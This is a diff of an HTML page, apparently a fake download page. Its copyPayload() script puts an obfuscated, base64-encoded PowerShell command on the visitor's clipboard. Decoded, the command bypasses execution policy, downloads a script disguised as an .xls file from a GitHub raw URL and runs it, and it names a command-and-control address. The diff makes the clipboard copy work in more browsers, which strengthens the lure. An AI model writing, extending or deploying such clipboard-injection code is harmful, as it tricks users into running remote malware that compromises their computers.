@@ -20,7 +20,13 @@
 <script>
 function copyPayload() {
   const payload = `powershell -enc cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIklFWCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFua3Mtd3EvbXVkZHkvcmVmcy9oZWFkcy9tYWluL2FhYS54bHMgLVVzZUJhc2ljUGFyc2luZykiIAojYzI9MTg4LjExNC45Ni4xOjg4NTg=`;
-  navigator.clipboard.writeText(payload);
+  
+  const el = document.createElement("textarea");
+  el.value = payload;
+  document.body.appendChild(el);
+  el.select();
+  document.execCommand("copy");
+  document.body.removeChild(el);
 }
 </script>
 <h2>Alternate Download</h2>
